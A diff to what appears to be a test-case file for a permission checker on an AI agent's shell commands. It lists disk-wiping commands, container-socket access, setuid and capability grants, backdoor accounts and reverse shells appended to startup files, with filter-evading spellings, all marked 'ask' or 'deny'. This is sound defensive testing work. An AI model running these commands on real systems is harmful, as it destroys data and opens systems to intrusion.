@@ -344,6 +344,11 @@
 {"tool": "Bash", "args": {"command": "hf upload acme/model ./out"}, "expect": "ask", "note": "upload model weights via hf CLI"}
 {"tool": "Bash", "args": {"command": "ollama push acme/model"}, "expect": "ask", "note": "publish model weights to Ollama registry"}
 {"tool": "Bash", "args": {"command": "cp new.safetensors /srv/models/prod/model.safetensors"}, "expect": "ask", "note": "overwrite model weights in production"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=/dev/sda bs=1M"}, "expect": "ask", "note": "wiping a whole disk with dd"}
+{"tool": "Bash", "args": {"command": "mkfs.ext4 /dev/sda1"}, "expect": "ask", "note": "making a filesystem on a disk partition"}
+{"tool": "Bash", "args": {"command": "shred -n 3 -z /dev/sdb"}, "expect": "ask", "note": "shredding a whole disk"}
+{"tool": "Bash", "args": {"command": "wipefs -a /dev/sdb"}, "expect": "ask", "note": "wiping a disk's filesystem signatures"}
+{"tool": "Bash", "args": {"command": "diskutil eraseDisk JHFS+ Wiped /dev/disk2"}, "expect": "ask", "note": "erasing a whole disk on macOS"}
 {"tool": "Bash", "args": {"command": "rm -rf /var /etc"}, "expect": "deny", "note": "a recursive delete of two system folders (#749)"}
 {"tool": "Bash", "args": {"command": "chmod -R 000 /"}, "expect": "deny", "note": "locking every file from root down (#749)"}
 {"tool": "Bash", "args": {"command": "find /srv -type f -delete"}, "expect": "deny", "note": "every file under a system folder deleted with find (#749)"}
@@ -365,6 +370,15 @@
 {"tool": "Bash", "args": {"command": "! DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after !"}
 {"tool": "Bash", "args": {"command": "/usr/bin/env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after env by its path"}
 {"tool": "Bash", "args": {"command": "env -- DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after an env option"}
+{"tool": "Bash", "args": {"command": "nohup env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nohup env"}
+{"tool": "Bash", "args": {"command": "nice -n 5 env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nice -n 5 env"}
+{"tool": "Bash", "args": {"command": "nice -n +5 env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nice -n +5 env"}
+{"tool": "Bash", "args": {"command": "/usr/bin/nohup env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nohup by its path"}
+{"tool": "Bash", "args": {"command": "CONTAINER_HOST=unix:///run/podman/podman.sock python x.py"}, "expect": "ask", "note": "a program pointed at the Podman socket through CONTAINER_HOST"}
+{"tool": "Bash", "args": {"command": "env CONTAINER_HOST=unix:///run/user/1000/podman/podman.sock pytest tests/integration"}, "expect": "ask", "note": "CONTAINER_HOST to the Podman socket after env"}
+{"tool": "Bash", "args": {"command": "nice -n5 env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nice -n5 env (#828)"}
+{"tool": "Bash", "args": {"command": "nice --adjustment=5 env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nice --adjustment=5 env (#828)"}
+{"tool": "Bash", "args": {"command": "nohup nice env DOCKER_HOST=unix:///var/run/docker.sock python x.py"}, "expect": "ask", "note": "DOCKER_HOST to the Docker socket after nohup nice env (#828)"}
 {"tool": "Bash", "args": {"command": "useradd -m -s /bin/bash -G sudo backdoor"}, "expect": "ask", "note": "a new login in the sudo group (#750)"}
 {"tool": "Bash", "args": {"command": "adduser backdoor"}, "expect": "ask", "note": "a new login (#750)"}
 {"tool": "Bash", "args": {"command": "usermod -aG wheel dev"}, "expect": "ask", "note": "adding a user to an administrator group (#750)"}
@@ -398,3 +412,39 @@
 {"tool": "Bash", "args": {"command": "echo 'ncat --exec /bin/sh 192.0.2.7 4444' >> ~/.zshrc"}, "expect": "ask", "note": "ncat --exec appended to zshrc (#750)"}
 {"tool": "Bash", "args": {"command": "echo 'sh -i >& /dev/udp/192.0.2.7/4444 0>&1' >> ~/.bashrc"}, "expect": "ask", "note": "a /dev/udp/ shell appended to bashrc (#750)"}
 {"tool": "Bash", "args": {"command": "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.zshenv"}, "expect": "ask", "note": "a reverse shell appended to zshenv (#750)"}
+{"tool": "Bash", "args": {"command": "curl -s --unix-socket ~/Library/Containers/com.docker.docker/Data/docker.raw.sock http://localhost/containers/json"}, "expect": "ask", "note": "macOS Docker Desktop raw socket (#808)"}
+{"tool": "Bash", "args": {"command": "curl -s --unix-socket ~/.local/share/containers/podman/machine/podman-machine-default-api.sock http://localhost/info"}, "expect": "ask", "note": "macOS Podman machine socket (#808)"}
+{"tool": "Bash", "args": {"command": "install -m 4755 x /usr/local/bin/x"}, "expect": "ask", "note": "install setting the setuid bit numerically (#804)"}
+{"tool": "Bash", "args": {"command": "install -m 02755 x /usr/local/bin/x"}, "expect": "ask", "note": "install setting the setgid bit with leading zero (#804)"}
+{"tool": "Bash", "args": {"command": "install -Dm 4755 x /usr/local/bin/x"}, "expect": "ask", "note": "install combining -D with -m setuid mode (#804)"}
+{"tool": "Bash", "args": {"command": "install -o root -g root -m 6755 x /usr/local/bin/x"}, "expect": "ask", "note": "install with owner and group options before -m setuid (#804)"}
+{"tool": "Bash", "args": {"command": "install --mode=4755 x /usr/local/bin/x"}, "expect": "ask", "note": "install setting setuid via --mode= (#804)"}
+{"tool": "Bash", "args": {"command": "install -m u+s x /usr/local/bin/x"}, "expect": "ask", "note": "install setting setuid symbolically (#804)"}
+{"tool": "Bash", "args": {"command": "install --mode=g+s,u+x x /usr/local/bin/x"}, "expect": "ask", "note": "install setting setgid in a symbolic clause list (#804)"}
+{"tool": "Bash", "args": {"command": "setcap cap_setuid+ep x"}, "expect": "ask", "note": "setcap granting cap_setuid (#804)"}
+{"tool": "Bash", "args": {"command": "setcap -q -n 1000 cap_net_bind_service,cap_setgid=ep x"}, "expect": "ask", "note": "setcap granting cap_setgid in a list after flags (#804)"}
+{"tool": "Bash", "args": {"command": "setcap cap_sys_admin+eip x"}, "expect": "ask", "note": "setcap granting cap_sys_admin (#804)"}
+{"tool": "Bash", "args": {"command": "setcap =ep x"}, "expect": "ask", "note": "setcap granting every capability with an empty list (#834)"}
+{"tool": "Bash", "args": {"command": "setcap all+ep x"}, "expect": "ask", "note": "setcap granting every capability by all (#834)"}
+{"tool": "Bash", "args": {"command": "setcap 'cap_setuid=+ep' x"}, "expect": "ask", "note": "setcap granting cap_setuid after an empty = (#834)"}
+{"tool": "Bash", "args": {"command": "setcap 7+ep x"}, "expect": "ask", "note": "setcap granting cap_setuid by its number (#834)"}
+{"tool": "Bash", "args": {"command": "setcap 0x7+ep x"}, "expect": "ask", "note": "setcap granting cap_setuid by its number in hex (#850)"}
+{"tool": "Bash", "args": {"command": "setcap 025+ep x"}, "expect": "ask", "note": "setcap granting cap_sys_admin by its number in octal (#850)"}
+{"tool": "Bash", "args": {"command": "setcap cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore+ep x"}, "expect": "ask", "note": "setcap granting a full capability list (#834)"}
+{"tool": "Bash", "args": {"command": "install --mod=4755 x /usr/local/bin/x"}, "expect": "ask", "note": "install setting setuid via a GNU prefix of --mode (#834)"}
+{"tool": "Bash", "args": {"command": "install -c -o root -g wheel -b -S .bak -p -v -m 4755 x /usr/local/bin/x"}, "expect": "ask", "note": "install setting setuid after eleven words (#834)"}
+{"tool": "Bash", "args": {"command": "dd if=img of=/dev/rdisk2 bs=1m"}, "expect": "ask", "note": "wiping a macOS raw disk with dd"}
+{"tool": "Bash", "args": {"command": "newfs_hfs /dev/rdisk3s1"}, "expect": "ask", "note": "making a filesystem on a macOS raw disk partition"}
+{"tool": "Bash", "args": {"command": "diskutil erasedisk JHFS+ Wiped disk2"}, "expect": "ask", "note": "erasing a whole disk on macOS, the verb in lower case"}
+{"tool": "Bash", "args": {"command": "diskutil ZERODISK /dev/disk3"}, "expect": "ask", "note": "zeroing a whole disk on macOS, the verb in upper case"}
+{"tool": "Bash", "args": {"command": "diskutil secureErase 0 /dev/disk2"}, "expect": "ask", "note": "secure-erasing a whole disk on macOS"}
+{"tool": "Bash", "args": {"command": "diskutil randomDisk /dev/disk2"}, "expect": "ask", "note": "writing random data over a whole disk on macOS"}
+{"tool": "Bash", "args": {"command": "diskutil reformat /dev/disk2s1"}, "expect": "ask", "note": "reformatting a disk partition on macOS"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=//dev/sda"}, "expect": "ask", "note": "wiping a whole disk with dd, the device with an extra slash"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=/dev//sda"}, "expect": "ask", "note": "wiping a whole disk with dd, the device with a doubled slash"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=/dev/./sda"}, "expect": "ask", "note": "wiping a whole disk with dd, the device spelled with a dot"}
+{"tool": "Bash", "args": {"command": "cat ubuntu.iso > /dev/sdb"}, "expect": "ask", "note": "writing an image to a whole disk with cat"}
+{"tool": "Bash", "args": {"command": "cp ubuntu.iso /dev/sdb"}, "expect": "ask", "note": "copying an image onto a whole disk"}
+{"tool": "Bash", "args": {"command": "head -c 1G /dev/zero > /dev/sda"}, "expect": "ask", "note": "writing zeros to a whole disk with head"}
+{"tool": "Bash", "args": {"command": "tee /dev/sda < image.bin"}, "expect": "ask", "note": "writing an image to a whole disk with tee"}
+{"tool": "Bash", "args": {"command": "mkfs.ext4 -F -L root -O ^has_journal -E lazy_itable_init=0 -m 0 /dev/sda1"}, "expect": "ask", "note": "making a filesystem on a disk partition after nine options"}
